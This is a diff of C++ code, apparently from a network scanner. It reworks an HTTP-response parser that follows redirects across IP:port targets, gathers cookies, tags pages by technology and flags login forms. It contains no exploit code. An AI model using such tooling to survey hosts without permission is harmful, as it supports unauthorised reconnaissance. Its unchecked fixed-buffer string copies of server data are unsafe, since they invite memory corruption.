 		l->flag = 0;
 		ps->flag = 0;
 	};
@@ -2423,19 +2617,16 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 #pragma endregion
 	
 #pragma region 302 Redirects
-	if(strstri(str, "301 found") != NULL || strstri(str, "302 found") != NULL || 
-		strstri(str, "redirect") != NULL  || strstri(str, "303 see other") != NULL ||
-		strstri(str, "302 document follows") != NULL || strstri(str, "301 moved") != NULL || strstri(str, "302 moved") != NULL ||
-		strstri(str, "302 redirect") != NULL || strstri(str, "301 redirect") != NULL || 
-		strstri(str, "http/1.1 302 ") != NULL || strstri(str, "http/1.0 302 ") != NULL)
+	if( strstri(str, "http/1.0 301") != NULL || strstri(str, "http/1.1 301") != NULL
+		|| strstri(str, "http/1.0 302") != NULL || strstri(str, "http/1.1 302") != NULL
+		|| strstri(str, "303 see other") != NULL
+		)
 	{	
-		char *temp, *temp2;
+		char *temp = NULL, *temp2 = NULL;
 		int res = 0;
-
 		if(strstri(str, "location: ") != NULL)
 		{
 			temp = strstri(str, "location: ");
-
 			if( strstr(temp+strlen("location: "), "\r\n") != NULL ) 
 			{
 				temp2 = strstri(temp + strlen("location: "), "\r\n");
@@ -2445,77 +2636,82 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 			{ 
 				temp2 = strstr(temp + strlen("location: "), "\n");
 				res = temp2 - temp;
-			} else res = 600;
+			}
+			else res = 600;
 
 			char newLocN[512] = {0};
-			char *tmp = {0};
-			if(strstri(temp, "/") != NULL) tmp = strstr(temp, "/");
-			if(res > 512) strncat(newLocN, temp + strlen("location: "), 512);
-			else strncat(newLocN, temp + strlen("location: "), res - strlen("location: "));
-			
-			if(strstr(newLocN, "http://") == NULL && strstr(newLocN, "https://") == NULL)
+			char *tmp = strstr(temp, "/");
+			if(tmp != NULL)
 			{
-				if(newLocN[0] != '.')
+				if(res > 512) strncat(newLocN, temp + strlen("location: "), 512);
+				else strncat(newLocN, temp + strlen("location: "), res - strlen("location: "));
+			
+				if(strstr(newLocN, "http://") == NULL && strstr(newLocN, "https://") == NULL)
 				{
-					if(newLocN[0] != '/')
+					if(newLocN[0] != '.')
 					{
-						char tnewLocN[512] = {0};
-						strcpy(tnewLocN, "/");
-						strcat(tnewLocN, newLocN);
-						strcpy(newLocN, tnewLocN);
+						if(newLocN[0] != '/')
+						{
+							char tnewLocN[512] = {0};
+							strcpy(tnewLocN, "/");
+							strcat(tnewLocN, newLocN);
+							strcpy(newLocN, tnewLocN);
+						};
 					};
 				};
+				redirectStr = std::string(newLocN);
+				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
+				{
+					redirStrLst->push_back(redirectStr);
+					redirectReconnect(ps->cookie, ip, port, newLocN, l, ps, redirStrLst, rBuff);
+				};
+				return -2;
 			};
-			
-			redirectStr = std::string(newLocN);
-			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
-			{
-				redirStrLst->push_back(redirectStr);
-				redirectReconnect(cookie, ip, port, newLocN, l, ps, redirStrLst, rBuff);
-			};
-			return -2;
 		}
 		else if(strstri(str, "location:") != NULL)
 		{
 			temp = strstri(str, "location:");
 
-			if( strstri(temp+strlen("location:"), "\r\n") != NULL ) 
+			if( strstr(temp+strlen("location:"), "\r\n") != NULL ) 
 			{
-				temp2 = strstri(temp + strlen("location:"), "\r\n");
+				temp2 = strstr(temp + strlen("location:"), "\r\n");
 				res = temp2 - temp;
 			} 
-			else if( strstri(temp+strlen("location:"), "\n") != NULL ) 
+			else if( strstr(temp+strlen("location:"), "\n") != NULL ) 
 			{ 
-				temp2 = strstri(temp + strlen("location:"), "\n");
+				temp2 = strstr(temp + strlen("location:"), "\n");
 				res = temp2 - temp;
-			} else res = 600;
+			}
+			else res = 600;
 
 			char newLoc[512] = {0};
-			char *tmp = {0};
-			if(strstri(temp, "/") != NULL) tmp = strstri(temp, "/");
-			if(res > 512) strncat(newLoc, temp+strlen("location:"), 512);
-			else strncat(newLoc, temp + strlen("location:"), res - strlen("location:"));
-
-			redirectStr = std::string(newLoc);
-			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
+			char *tmp = strstr(temp, "/");
+			if(tmp != NULL)
 			{
-				redirStrLst->push_back(redirectStr);
-				redirectReconnect(cookie, ip, port, newLoc, l, ps, redirStrLst, rBuff);
+				if(res > 512) strncat(newLoc, temp+strlen("location:"), 512);
+				else strncat(newLoc, temp + strlen("location:"), res - strlen("location:"));
+
+				redirectStr = std::string(newLoc);
+				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
+				{
+					redirStrLst->push_back(redirectStr);
+					redirectReconnect(ps->cookie, ip, port, newLoc, l, ps, redirStrLst, rBuff);
+				};
+				return -2;
 			};
-			return -2;
 		};
 	};
 
-	if( strstri(str, "see other") != NULL 
-		|| strstri(str, "object moved") != NULL || strstri(str, "moved temporarily") != NULL
-		|| strstri(str, "moved permanently") != NULL )
+	if( strstri(str, "see other") != NULL || strstri(str, "object moved") != NULL 
+		|| strstri(str, "moved temporarily") != NULL || strstri(str, "moved permanently") != NULL 
+		)
 	{
 		char *temp;
 
 		if(strstri(str, "location=") != NULL) 
 		{
 			temp = strstri(str, "location=");
-			char *temp2 = strstri(temp+strlen("location="), ">");
+			char *temp2 = strstr(temp+strlen("location="), ">");
 			int res = temp2 - temp;
 			char lol[512] = {0};
 
@@ -2526,7 +2722,7 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
 			{
 				redirStrLst->push_back(redirectStr);
-				redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
+				redirectReconnect(ps->cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
 			};
 			return -2;
 		}
@@ -2534,14 +2730,13 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 		{
 			temp = strstri(str, "location:");
 			char *temp2;
-			if(strstri(temp+strlen("location:"), "\r\n") != 0) {temp2 = strstri(temp+strlen("location:"), "\r\n"); 
+			if(strstr(temp+strlen("location:"), "\r\n") != 0) {temp2 = strstr(temp+strlen("location:"), "\r\n"); 
 			}
-			else if(strstri(temp+strlen("location:"), "\r\n\r\n\n") != 0) temp2 = strstri(temp+strlen("location:"), "\r\n\r\n\n"); 
-			else if(strstri(temp+strlen("location:"), "\n") != 0) {temp2 = strstri(temp+strlen("location:"), "\n"); 
-			}
-			else if(strstri(temp+strlen("content-length"), "\n") != 0) temp2 = strstri(temp+strlen("content-length"), "\n"); 
-			else if(strstri(temp+strlen("location: "), " ") != 0) temp2 = strstri(temp+strlen("location: "), " "); 
-			else temp2 = strstri(temp+strlen("location:"), "server");
+			else if(strstr(temp+strlen("location:"), "\r\n\r\n\n") != 0)	temp2 = strstr(temp+strlen("location:"), "\r\n\r\n\n"); 
+			else if(strstr(temp+strlen("location:"), "\n") != 0)			temp2 = strstr(temp+strlen("location:"), "\n"); 
+			else if(strstr(temp+strlen("content-length"), "\n") != 0)		temp2 = strstr(temp+strlen("content-length"), "\n"); 
+			else if(strstr(temp+strlen("location: "), " ") != 0)			temp2 = strstr(temp+strlen("location: "), " "); 
+			else															temp2 = strstri(temp+strlen("location:"), "server");
 			int res = temp2 - temp;
 			char lol[512] = {0};		
 
@@ -2554,12 +2749,15 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
 			{
 				redirStrLst->push_back(redirectStr);
-				redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
+				redirectReconnect(ps->cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
 			};
 			return -2;
 		};
 	};
-	if(strstri(str, "http-equiv=\"refresh\"") != NULL || strstri(str, "http-equiv=refresh") != NULL || strstri(str, "http-equiv='refresh'") != NULL)
+	if(strstri(str, "http-equiv=\"refresh\"") != NULL 
+		|| strstri(str, "http-equiv=refresh") != NULL 
+		|| strstri(str, "http-equiv='refresh'") != NULL
+		)
 	{
 		char *temp = NULL;
 		char *strTmp = NULL;
@@ -2579,17 +2777,22 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 
 				if(temp[4] == '"' || temp[4] == '\'' || temp[4] == ' ' || temp[4] == '\n' || temp[4] == '\r')
 				{
-					temp2 = FindFirstOcc(temp + 6, " \n>\"'");
-					sz = (int)(temp2 - temp) - 5;
-					strncpy(temp3, (char*)(temp + 5), (sz < 128 ? sz : 128));
+					temp2 = _findFirstOcc(temp + 6, " \n>\"'");
+					if(temp2 != NULL)
+					{
+						sz = (int)(temp2 - temp) - 5;
+						strncpy(temp3, (char*)(temp + 5), (sz < 128 ? sz : 128));
+					};
 				}
 				else 
 				{
-					temp2 = FindFirstOcc(temp + 4, " \n>\"'");
-					sz = (int)(temp2 - temp) - 4;
-					strncpy(temp3, (char*)(temp + 4), sz < 128 ? sz : 128);
+					temp2 = _findFirstOcc(temp + 4, " \n>\"'");
+					if(temp2 != NULL)
+					{
+						sz = (int)(temp2 - temp) - 4;
+						strncpy(temp3, (char*)(temp + 4), sz < 128 ? sz : 128);
+					};
 				};
-
 				if(strstri(temp3, "http://") == NULL && strstri(temp3, "https://") == NULL)
 				{
 					if(temp3[0] != '.')
@@ -2603,309 +2806,101 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 						};
 					};
 				};
-
 				redirectStr = std::string(temp3);
 				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
 				{
 					redirStrLst->push_back(redirectStr);
-					redirectReconnect(cookie, ip, port, temp3, l, ps, redirStrLst, rBuff);
+					redirectReconnect(ps->cookie, ip, port, temp3, l, ps, redirStrLst, rBuff);
 				};
 				strcat(ps->headr, " ");
 				return -2;
 			};
-
 			strcat(ps->headr, finalstr); 
 			strcat(ps->headr, " ");
 			return 0;
 		};
 	};
-	if((strstri(str, "location.href") != NULL || strstri(str, "window.location =") != NULL || strstri(str, "window.location=") != NULL)
-		&& strstri(str, "onClick=\"location.href") == NULL)
+	if(strstri(str, "<script") != NULL)
 	{
-		char startPoint[32] = {0};
-		if(strstri(str, "location.href=") != NULL) strcpy(startPoint, "location.href=");
-		else if(strstri(str, "location.href =") != NULL)  strcpy(startPoint, "location.href =");
-		else if(strstri(str, "window.location=") != NULL)  strcpy(startPoint, "window.location=");
-		else if(strstri(str, "window.location =") != NULL)  strcpy(startPoint, "window.location =");
-		else 
+		if(strlen(ps->cookie) == 0) _getJSCookie(ps->cookie, str, ip, port);
+		char *ptr1 = strstri(str, "<script");
+		char *ptr2 = NULL;
+		char linkPtr[512] = {0};
+		do
 		{
-			strcat(ps->headr, "[JS-Err: Key-word]");
-		};
-		if(strlen(startPoint) != 0)
-		{
-			char tredStr[512] = {0};		
-			char *temp1 = strstri(str, startPoint);
-			char *temp2 = FindFirstOcc(temp1, "\"'}");
-			char *temp3 = FindFirstOcc(temp2 + 1, "\"'}");
-			int sz = temp3 - temp2 - 1;
-			strncpy(tredStr, temp2 + 1, (sz < 511 ? sz : 511));
-			char redStr[512] = {0};			
-			if(strstri(tredStr, "+") != NULL)
+			ZeroMemory(linkPtr, 512);
+			ptr2 = strstri(ptr1, "</script>");
+			if(ptr2 != NULL)
 			{
-				strncpy(redStr, tredStr + 1, 511);
-				sz = strlen(tredStr) - 1;
-			}
-			else strcpy(redStr, tredStr);
+				int sz = ptr2 - ptr1;
+				char *scriptContainer = new char[sz + 1];
+				ZeroMemory(scriptContainer, sz + 1);
+				strncpy(scriptContainer, ptr1, sz);
+				memset(scriptContainer + sz, '\0', 1);
 
-			if(sz == 0)
-			{
-				temp2 = FindFirstOcc(temp1, "=");
-				temp3 = FindLastOcc(temp2 + 1, " ");
-				char *temp4 = FindFirstOcc(temp3 + 1, ";\r\n ");
-				sz = temp4 - temp3 - 1;
-				strncpy(redStr, temp3 + 1, (sz < 511 ? sz : 511));
-			};
-
-			if(strstri(redStr, "/") == NULL && strstri(redStr, ".") == NULL)
-			{
-				strncpy(redStr, _ValidateRedStr(str, redStr), 511);
-			};
-
-			if(strlen(redStr) > 0 && ip != NULL)
-			{
-				if(strstr(redStr, "http://") == NULL && strstr(redStr, "https://") == NULL)
+				if(strstri(scriptContainer, "location.href") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location.href", ip, port);
+				else if(strstri(scriptContainer, "window.location") != NULL)	_getLinkFromJSLocation(linkPtr, scriptContainer, "window.location", ip, port);
+				else if(strstri(scriptContainer, "location.replace") != NULL)	_getLinkFromJSLocation(linkPtr, scriptContainer, "location.replace", ip, port);
+				else if(strstri(scriptContainer, "location") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location", ip, port);
+				
+				if(strlen(linkPtr) != 0)
 				{
-					if(redStr[0] != '/')
+					redirectStr = std::string(linkPtr);
+					if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
 					{
-						char tempRedStr[512] = {0};			
-						strcpy(tempRedStr, "/");
-						strcat(tempRedStr, redStr);
-						strcpy(redStr, tempRedStr);
+						redirStrLst->push_back(redirectStr);
+						redirectReconnect(ps->cookie, ip, port, linkPtr, l, ps, redirStrLst, rBuff);
 					};
 				};
-				redirectStr = std::string(redStr);
-				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
-				{
-					redirStrLst->push_back(redirectStr);
-					redirectReconnect(cookie, ip, port, redStr, l, ps, redirStrLst, rBuff);
-				};
-				return -2;
+				delete []scriptContainer;
+				if(ps->flag == 1) return -2;
 			}
 			else
 			{
-				if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::location.href_Parser.");
-				++Filt;
-				strcpy(ps->headr, "[IGNR_ADDR]"); 
-				strcpy(ps->path, "/"); 
-				return 0;
+				strcat(ps->headr, "[Cannot retrieve \"<script>\"-block]"); 
+				strcat(ps->headr, " ");
+				break;
 			};
-		};
+			ptr1 = strstri(ptr2, "<script");
+		}
+		while(ptr1 != NULL);
 	};
-	if(strstri(str, "location.replace") != NULL)
-	{
-		char redStr[512] = {0};		
-		char tredStr[512] = {0};		
-		char *temp1 = strstri(str, "location.replace");	
-		char *temp2 = FindFirstOcc(temp1, "(");
-		char *temp3 = FindFirstOcc(temp2 + 1, ")");	
-		int sz = temp3 - temp2 - 1;
-		strncpy(tredStr, temp2 + 1, (sz < 511 ? sz : 511));
-		if(strstr(tredStr, "\"") != NULL || strstri(tredStr, "'") != NULL)
-		{
-			temp2 = FindFirstOcc(tredStr, "\"'");
-			temp3 = FindFirstOcc(temp2 + 1, "\"'");	
-			sz = temp3 - temp2 - 1;								
-			strncpy(redStr, temp2 + 1, (sz < 511 ? sz : 511));
-		}
-		else if(strstr(tredStr, " ") != NULL )
-		{
-			char tredStr2[512] = {0};	
-			temp1 = strstr(tredStr, " ");
-			temp2 = FindLastOcc(temp1, " ");				
-			temp3 = FindFirstOcc(temp2 + 1, " ");				
-			sz = temp3 - temp2 - 1;								
-			strncpy(tredStr2, temp2 + 1, (sz < 511 ? sz : 511));
-			strncpy(redStr, _ValidateRedStr(str, tredStr2), 511);
-		}
-		else
-		{
-			strncpy(redStr, _ValidateRedStr(str, tredStr), 511);			
-		};
-
-		if(strlen(redStr) > 0)
-		{
-			redirectStr = std::string(redStr);
-			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
-			{
-				redirStrLst->push_back(redirectStr);
-				redirectReconnect(cookie, ip, port, redStr, l, ps, redirStrLst, rBuff);
-			};
-			return -2;
-		}
-		else
-		{
-			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _header::location.replace_Parser.");
-			++Filt;
-			strcpy(ps->headr, "[IGNR_ADDR]"); 
-			strcpy(ps->path, "/"); 
-			return 0;
-		};
-	};
-	
 #pragma endregion
 
-	if((strstri(str, "location ='") != NULL || strstri(str, "location='") != NULL
-			|| strstri(str, "location =\"") != NULL || strstri(str, "location=\"") != NULL
-			|| strstri(str, "location = \"") != NULL || strstri(str, "location= \"") != NULL
-			|| strstri(str, "location = '") != NULL || strstri(str, "location= '") != NULL)
-			&& strstri(str, "window.location") == NULL
+	if(strstri(str, "ActiveXObject") != NULL 
+		|| strstri(str, ".cab") != NULL 
+		|| strstri(str, "clsid:") != NULL
 		)
-	{ 
-		char *temp2 = {0}, *temp1 = {0}, *temp = {0};
-		char quoteArr[1] = {0};
-		int checkRes = 0;
-		int offset = 0;
-		if(strstri(str, "location =") != NULL)
-		{
-			offset = strlen("location =");			
-			temp = strstri(str, "location =");
-			quoteArr[0] = (char)(temp[strlen("location =")]);
-			if(quoteArr[0] == ' ') 
-			{
-				quoteArr[0] = (char)(temp[strlen("location =") + 1]);
-				++offset;
-			};
-		}
-		else if(strstri(str, "location=") != NULL)
-		{
-			offset = strlen("location=");
-			temp = strstri(str, "location=");
-			quoteArr[0] = (char)(temp[strlen("location=")]);
-			if(quoteArr[0] == ' ')
-			{
-				quoteArr[0] = (char)(temp[strlen("location=") + 1]);
-				++offset;
-			};
-		};
-
-		memset(quoteArr + 1, '\0', 1);
-
-		char location[512] = {0};
-		if(strstri(temp + offset + 1, quoteArr) != NULL) temp1 = strstri(temp + offset + 1, quoteArr);
-		else 
-		{
-			strcpy(ps->headr, "[JARedirect: Cannot retrieve link.]"); 
-			strcpy(ps->path, "/"); 
-			return 0;
-		};
-		checkRes = temp1 - temp - offset;
-
-		char newLoc2[512] = {0};
-		ZeroMemory(newLoc2, sizeof(newLoc2));
-		if (checkRes > 512 || checkRes < 0) checkRes = 512;
-		strncpy(location, temp + 1 + offset, checkRes - 1);
-		if(strstri(location, "http") != NULL) strcpy(newLoc2, location);
-		else
-		{
-			strncpy(newLoc2, "http://", strlen("http://"));
-			strcat(newLoc2, ip);
-			strcat(newLoc2, ":");
-			strcat(newLoc2, std::to_string((long double)port).c_str());
-			if(temp[1 + offset] != '/') strcat(newLoc2, "/");
-			strncat(newLoc2, temp + 1 + offset, checkRes - 1);
-		};		
-
-		redirectStr = std::string(newLoc2);
-		if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
-		{
-			redirStrLst->push_back(redirectStr);
-			redirectReconnect(cookie, ip, port, newLoc2, l, ps, redirStrLst, rBuff);
-		};
-		return -2;
+	{
+		strcat(ps->headr, "[ActiveX]");
 	};
-
+	if(strstri(str, "<applet") != NULL 
+		&& strstri(str, ".jar") != NULL
+		)
+	{
+		strcat(ps->headr, "[Java]");
+	};
+	if(strstri(str, "<script") != NULL)
+	{
+		strcat(ps->headr, "[Javascript]");
+	};
+	if(strstri(str, "<video") != NULL)
+	{
+		strcat(ps->headr, "[Video]");
+	};
+	
 	if(strstri(str, "<frameset") != NULL || strstri(str, "<frame") != NULL || strstri(str, "<iframe") != NULL)
 	{
-		char *str1;
-		char *str2;
+		char *str1 = str;
+		char *str2 = NULL;
 		char lol[128] = {0};
 		char tag[16] = {0};
 		int AreaLen = 0;
-
-		if(strstri(str, "<frameset") != NULL) str1 = strstri(str, "<frameset");
-		else if(strstri(str, "<frame") != NULL) str1 = strstri(str, "<frame");
-		else if(strstri(str, "<iframe") != NULL) str1 = strstri(str, "<iframe");
-
-		if(strstri(str1, "src=\"") != NULL) 
+		do
 		{
-			str1 = strstri(str1, "src=\""); 
-			AreaLen = 5;
-		}
-		else if(strstri(str1, "src='") != NULL) 
-		{
-			str1 = strstri(str1, "src='");
-			AreaLen = 5;
-		}
-		else if(strstri(str1, "src = \"") != NULL)
-		{
-			str1 = strstri(str1, "src = \"");
-			AreaLen = 7;
-		}
-		else if(strstri(str1, "src = '") != NULL) 
-		{
-			str1 = strstri(str1, "src = '");
-			AreaLen = 7;
-		}
-		else if(strstri(str1, "src=") != NULL) 
-		{
-			str1 = strstri(str1, "src=");
-			AreaLen = 4;
-		}
-		else if(strstri(str1, "src = ") != NULL) 
-		{
-			str1 = strstri(str1, "src = ");
-			AreaLen = 6;
-		}
-		else 
-		{
-			str1 = NULL;
-			AreaLen = 0;
-		};
-
-		while(str1 != NULL)
-		{
-			str2 = FindFirstOcc(str1 + AreaLen, "'\">");
-
-			char script[128] = {0};
-			int sz = (int)(str2 - str1) - AreaLen;
-			if((int)(str2 - str1) < 128) strncpy(script, str1 + AreaLen, sz);
-			if(strstri(script, "http://") == NULL) 
-			{
-				strcpy(lol, "http://");
-				strcat(lol, ip);
-				strcat(lol, ":");
-				strcat(lol, std::to_string((long double)port).c_str());
-				if(script[0] != '/') strcat(lol, "/");
-				strcat(lol, script);
-			}
-			else strcpy(lol, script);
-
-			int flag = 0;
-			if(sz > 0) 
-			{
-				redirectStr = std::string(lol);
-				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
-				{
-					redirStrLst->push_back(redirectStr);
-					redirectReconnect(cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
-				};
-			}
-			else
-			{
-				strcat(ps->headr, " ");
-				strcat(ps->headr, "[Frame redirector: Zero-length location?]");
-				strcpy(ps->path, "/"); 
-			};
-
-			flag = ps->flag;
-			if(flag == 1 || flag == 11 || flag == 12
-				|| flag == 13 || flag == 14 || flag >= 17 || flag == 10)
-			{
-				return -2;
-			};
-
 			if(strstri(str1, "<frameset") != NULL) str1 = strstri(str1, "<frameset");
 			else if(strstri(str1, "<frame") != NULL) str1 = strstri(str1, "<frame");
+			else if(strstri(str1, "<iframe") != NULL) str1 = strstri(str1, "<iframe");
 			else break;
 
 			if(strstri(str1, "src=\"") != NULL) 
@@ -2943,9 +2938,63 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 				str1 = NULL;
 				AreaLen = 0;
 			};
-		};
+
+			if(str1 != NULL)
+			{
+				str2 = _findFirstOcc(str1 + AreaLen, "'\">");
+				if(str2 != NULL)
+				{
+					char script[128] = {0};
+					int sz = (int)(str2 - str1) - AreaLen;
+					if((int)(str2 - str1) < 128) strncpy(script, str1 + AreaLen, sz);
+					if(strstri(script, "http://") == NULL) 
+					{
+						strcpy(lol, "http://");
+						strcat(lol, ip);
+						strcat(lol, ":");
+						strcat(lol, std::to_string((long double)port).c_str());
+						if(script[0] != '/') strcat(lol, "/");
+						strcat(lol, script);
+					}
+					else strcpy(lol, script);
+
+					int flag = 0;
+					if(sz > 0) 
+					{
+						if(script[0] != '#')
+						{
+							redirectStr = std::string(lol);
+							if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
+							{
+								redirStrLst->push_back(redirectStr);
+								redirectReconnect(ps->cookie, ip, port, lol, l, ps, redirStrLst, rBuff);
+							};
+						}
+						else
+						{
+							strcat(ps->headr, "[Unknown frame: \"");
+							strcat(ps->headr, script);
+							strcat(ps->headr, "\"]");
+						};
+					}
+
+					flag = ps->flag;
+					if(flag == 1 || flag == 11 || flag == 12
+						|| flag == 13 || flag == 14 || flag >= 17 || flag == 10)
+					{
+						return -2;
+					};
+				}
+				else
+				{
+					stt->doEmitionRedFoundData("[FrameLocator] Corrupted tag! [" + QString(ip) +":" + QString::number(port) + "]");
+				};
+			};
+		}
+		while(str1 != NULL);
 		return -2;
-	}
+	};
+
 	if(strstri(str, "<form ") != NULL) 
 	{
 		strcat(ps->headr, " [Login form detected]");
@@ -2954,30 +3003,42 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 		if(ptr2 != NULL)
 		{
 			char *ptr3 = strstri(ptr2, "=");
-			char *ptr4 = 0;
-			char *ptrEnd = 0;
-			int sz = 0;
-			char redirStr[512] = {0};
-			if(ptr3[1] == ' ' || ptr3[1] == '"' || ptr3[1] == '\"')
+			if(ptr3 != NULL)
 			{
-				ptr4 = FindFirstOcc(ptr3, " \"'\n\r");
-				ptrEnd = FindFirstOcc(ptr4 + 1, " \"'\n\r");
-				sz = ptrEnd - ptr4 - 1;
-				strncpy(redirStr, ptr4 + 1, sz < 512 ? sz : 512);
-			}
-			else 
-			{
-				ptrEnd = FindFirstOcc(ptr3, " \"'\n\r");
-				sz = ptrEnd - ptr3 - 1;
-				strncpy(redirStr, ptr3 + 1, sz < 512 ? sz : 512);
+				char *ptr4 = NULL;
+				char *ptrEnd = NULL;
+				int sz = 0;
+				char redirStr[512] = {0};
+				if(ptr3[1] == ' ' || ptr3[1] == '"' || ptr3[1] == '\"')
+				{
+					ptr4 = _findFirstOcc(ptr3, " \"'\n\r");
+					if(ptr4 != NULL)
+					{
+						ptrEnd = _findFirstOcc(ptr4 + 1, " \"'\n\r");
+						if(ptrEnd != NULL)
+						{
+							sz = ptrEnd - ptr4 - 1;
+							strncpy(redirStr, ptr4 + 1, sz < 512 ? sz : 512);
+						};
+					};
+				}
+				else 
+				{
+					ptrEnd = _findFirstOcc(ptr3, " \"'\n\r");
+					if(ptrEnd != NULL)
+					{
+						sz = ptrEnd - ptr3 - 1;
+						strncpy(redirStr, ptr3 + 1, sz < 512 ? sz : 512);
+					};
+				};
+
+				if(std::find(redirStrLst->begin(), redirStrLst->end(), redirStr) == redirStrLst->end()) 
+				{		
+					redirStrLst->push_back(redirStr);
+					redirectReconnect(ps->cookie, ip, port, redirStr, l, ps, redirStrLst, rBuff);
+				};
+				return -2;
 			};
-		
-			if(std::find(redirStrLst->begin(), redirStrLst->end(), redirStr) == redirStrLst->end()) 
-			{		
-				redirStrLst->push_back(redirStr);
-				redirectReconnect(cookie, ip, port, redirStr, l, ps, redirStrLst, rBuff);
-			};
-			return -2;
 		}
 		else
 		{
@@ -2985,7 +3046,7 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 		};
 		return 0;
 	};
-
+	
 	if(strlen(ps->headr) == 0)
 	{
 		strcat(ps->headr, "[Empty title]");
@@ -2998,9 +3059,9 @@ int Lexems::_header(char *ip, int port, char str[], Lexems *l, PathStr *ps, std:
 			strcat(ps->headr, "[No body]");
 		};
 
-		if(strstri(str, "\r\n\r\n") != NULL) 
+		if(strstr(str, "\r\n\r\n") != NULL) 
 		{
-			char *tempStr = strstri(str, "\r\n\r\n");
+			char *tempStr = strstr(str, "\r\n\r\n");
 			if(strlen(tempStr) - 4 >= 250)
 			{
 				if(strstr(str, "Content-Encoding: gzip") != NULL)
